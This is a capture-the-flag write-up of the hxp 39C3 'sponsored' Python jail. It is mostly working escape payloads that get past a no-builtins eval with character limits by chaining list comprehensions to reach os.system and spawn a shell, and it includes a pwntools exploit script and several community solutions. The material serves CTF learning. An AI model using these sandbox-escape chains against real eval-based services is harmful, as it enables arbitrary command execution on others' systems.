# hxp 39C3 CTF sponsored

```python
#!/usr/local/bin/python3

code = input("jail> ")
assert all(code.count(c) <= 1 for c in ".,(+)")
print(eval(code, {"__builtins__": {}}))
```

Requirements:

1. At most one occurrence for each character `.,(+)`: use function call + `__getattribute__` for `a.b`, call function step by step and save intermediate values via list comprehension
2. No builtins: use `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`

This problem is a stricter version of [SECCON CTF 2025 Quals excepython](../../2025-12-13-seccon-ctf-2025-quals/excepython.md), with the removal of loops and exception handling; it is also a stricter version of [jailCTF 2025 one](./jailctf-2025-one.md), where only a single '.' was allowed, now extended to include ',', '+', and parentheses.

Inspired by the solution by @D1N0 regarding excepython, we can use list comprehension to do function calls in multiple steps and save intermediate values. Here's the idea:

1. `[... for step in "1234567"]` allows us to do things in steps
2. `[[ex:= ...] for step in "1234567"]` allows us to assign `ex` to intermediate values and use it in the next iteration

Next, the things we need:

1. `a.b` becomes `a.__getattribute__(b)`; However, sometimes we need `a.__getattribute__(a, b)` when `a` is a type; so we split it into two steps: `ex[0].__getattribute__` and `ex[0](*ex[1:])`
2. If we want to call `a.__getattribute__(a, b)`, we need `ex` to become `[a, a, b]`
3. So we need basic list operations: `ex+[x]` and `ex*2`, so `[a]` -> `[a, a]` -> `[a, a, b]`
4. Then, we can convert `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")` into multiple steps:

```python
# step a: ex = [[]]
# step b: ex = [[], "__setattr__"]
# step c: ex = [[].__getattribute__, "__setattr__"]
# step d: ex = [[].__setattr__]
# step e: ex = [[].__setattr__, "__objclass__"]
# step f: ex = [[].__setattr__.__getattribute__, "__objclass__"]
# step g: ex = [object]
# step h: ex = [object, object]
# step i: ex = [object, object, "__subclasses__"]
# step j: ex = [object.__getattribute__, object, "__subclasses__"]
# step k: ex = [object.__subclasses__]
# step l: ex = [object.__subclasses__()]
# step m: ex = [<class 'os._wrap_close'>]
# step n: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>]
# step o: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>, "__init__"]
# step p: ex = [<class 'os._wrap_close'>.__getattribute__, <class 'os._wrap_close'>, "__init__"]
# step q: ex = [<class 'os._wrap_close'>.__init__]
# step r: ex = [<class 'os._wrap_close'>.__init__, "__globals__"]
# step s: ex = [<class 'os._wrap_close'>.__init__.__getattribute__, "__globals__"]
# step t: ex = [<class 'os._wrap_close'>.__init__.__globals__]
# step u: ex = [<built-in function system>]
# step v: ex = [<built-in function system>, "sh"]
# step w: system("sh")
os_wrap_index = 158
print([[ex := [[]] if step == "a" else ex + [x] if step == "b" or step == "e" or step == "i" or step == "o" or step == "r" or step == "v" else [ex[0].__getattribute__, *ex[1:]] if step == "c" or step == "f" or step == "j" or step == "p" or step == "s" else [ex[0](*ex[1:])] if step == "d" or step == "g" or step == "k" or step == "l" or step == "q" or step == "t" or step == "w" else ex*2 if step == "h" or step == "n" else [ex[0][os_wrap_index]] if step == "m" else [ex[0]["system"]] if step == "u" else None for x in ["__setattr__" if step == "b" else "__objclass__" if step == "e" else "__subclasses__" if step == "i" else "__init__" if step == "o" else "__globals__" if step == "r" else "sh" if step == "v" else None]] for step in "abcdefghijklmnopqrstuvw"])
```

Attack script that works both locally and in Docker:

```python
from pwn import *

if args.REMOTE:
    os_wrap_close_index = 167
    p = remote("172.18.0.2", 1024)
else:
    os_wrap_close_index = 158
    p = process(["python3", "jail.py"])
p.recvuntil(b"jail>")

# step a: ex = [[]]
# step b: ex = [[], "__setattr__"]
# step c: ex = [[].__getattribute__, "__setattr__"]
# step d: ex = [[].__setattr__]
# step e: ex = [[].__setattr__, "__objclass__"]
# step f: ex = [[].__setattr__.__getattribute__, "__objclass__"]
# step g: ex = [object]
# step h: ex = [object, object]
# step i: ex = [object, object, "__subclasses__"]
# step j: ex = [object.__getattribute__, object, "__subclasses__"]
# step k: ex = [object.__subclasses__]
# step l: ex = [object.__subclasses__()]
# step m: ex = [<class 'os._wrap_close'>]
# step n: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>]
# step o: ex = [<class 'os._wrap_close'>, <class 'os._wrap_close'>, "__init__"]
# step p: ex = [<class 'os._wrap_close'>.__getattribute__, <class 'os._wrap_close'>, "__init__"]
# step q: ex = [<class 'os._wrap_close'>.__init__]
# step r: ex = [<class 'os._wrap_close'>.__init__, "__globals__"]
# step s: ex = [<class 'os._wrap_close'>.__init__.__getattribute__, "__globals__"]
# step t: ex = [<class 'os._wrap_close'>.__init__.__globals__]
# step u: ex = [<built-in function system>]
# step v: ex = [<built-in function system>, "sh"]
# step w: system("sh")
code = f'[[ex := [[]] if step == "a" else ex + [x] if step == "b" or step == "e" or step == "i" or step == "o" or step == "r" or step == "v" else [ex[0].__getattribute__, *ex[1:]] if step == "c" or step == "f" or step == "j" or step == "p" or step == "s" else [ex[0](*ex[1:])] if step == "d" or step == "g" or step == "k" or step == "l" or step == "q" or step == "t" or step == "w" else ex*2 if step == "h" or step == "n" else [ex[0][{os_wrap_close_index}]] if step == "m" else [ex[0]["system"]] if step == "u" else None for x in ["__setattr__" if step == "b" else "__objclass__" if step == "e" else "__subclasses__" if step == "i" else "__init__" if step == "o" else "__globals__" if step == "r" else "sh" if step == "v" else None]] for step in "abcdefghijklmnopqrstuvw"]'
print(list(code.count(c) for c in ".,(+)"))
p.sendline(code.encode())
p.interactive()
```

Another approach that works in some environment, but not in the jail due to missing `__import__`:

```python
get_flag = '[].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")'
print([[[ex := [[lambda x: []][0] if step == "1" else ex if step == "3" else [lambda x: ex[0]][0] if step == "4" else [lambda x: ex["eval"]][0] if step == "6" else ex if step == "7" else ex.__getattribute__][0](*x)][0] for x in [["__reduce_ex__"] if step == "2" else [2] if step == "3" else ["__builtins__"] if step == "5" else [get_flag]]] for step in "1234567"])
```

It uses another chain: `[].__reduce_ex__(2)[0].__builtins__["eval"]("print(1234)")`. But it fails in `eval` sometimes.

CTF archive for this problem: <https://github.com/sajjadium/ctf-archives/tree/main/ctfs/hxp/2025/misc/sponsored>

Solutions on Discord:

@sandr0:

```python
# [].__class__.__base__.__subclasses__()[158].close.__globals__["system"]("cat flag\x2etxt")
[[[[o:=[]] if i == "0" else 0] and[[p:="__base__"] if i == "1" else 0] and[[p:="__subclasses__"] if i == "2" else 0] and[[s:=["__class__"]] if i == "0" else 0] and[[p:="close"] if i in "5" else 0] and[[p:="__globals__"] if i in "6" else 0] and[[s:=[o,p]] if i in "1256" else 0] and[[s:=[]] if i in "3" else 0] and[[tt:=o.__getattribute__] if i in "0125" else 0] and[[tt:=o] if i in "3" else 0] and[[o:=o[-4]] if i in "4" else 0] and[[s:=["cat flag\x2etxt"]] if i in "7" else 0] and[[tt:=o["system"]] if i in "7" else 0] and[[o:=tt(*s)] if i in "0123567" else 0]] for i in "01234567"]
```

@Muhammed.:

```python
[ [ [[[[i == "a" and [x:=lambda: []] or [i == "b" and [x:=[]] and [__setattr__:= ret]][0] or [i == "c" and [[tt:=ret]]][0] or [i == "d" and [x:=ret[0]]][0] or [i == "e" and [__builtins__:=ret] and [tt:=__builtins__["__import__"]]][0] or [i == "f" and [x:=ret]][0] or [i == "g" and [tt:=ret]][0]]== [[i == "b" or i == "a" or i == "d" or i == "f"][0] and [tt:=x.__getattribute__]]] and [i=="a" and [q:=["__setattr__"]] or i=="b" and [q:=["__reduce_ex__"]] or i =="c" and [q:=[3]] or i == "d" and [q:=["__builtins__"]] or i == "e" and [q:=["os"]] or i == "f" and [q:=["system"]] or i == "g" and [q:=["sh"]]]]][0] ] == [ret:=tt(*q)] if True else [a:=1] for i in "abcdefg" ]
```

@Crazyman:

```python
[[[{k in {0} and [obj := []] and 1} |{[args:=d[k]] and 1} |{k in {1}|{2}|{5} and [t := obj] and [args:={t:''}|d[k]] and
1} |{k in {3} and [args:={t:''}|d[k]] and 1} |{k in {0}|{1}|{2}|{5}|{6}|{9} and [obj := obj.__getattribute__] and 1} |{k in {0}|{1}|{2}|{3}|{5}|{6}|{8}|{9}|{10} and [obj := obj(*args)] and 1} |{k in {4}|{7} and [obj := obj[d[k]]] and 1}] for k in d] for d in [{0: {'__class__':''}}|{1: {'__class__':''}}|{2: {'__subclasses__':''}}|{3: {}}|{4:0}|{5:{'register':''}}|{6:{'__builtins__':''}}|{7:'__import__'}|{8:{'os':''}}|{9:{'system':''}}|{10:{'/bin/sh':''}}]]
```
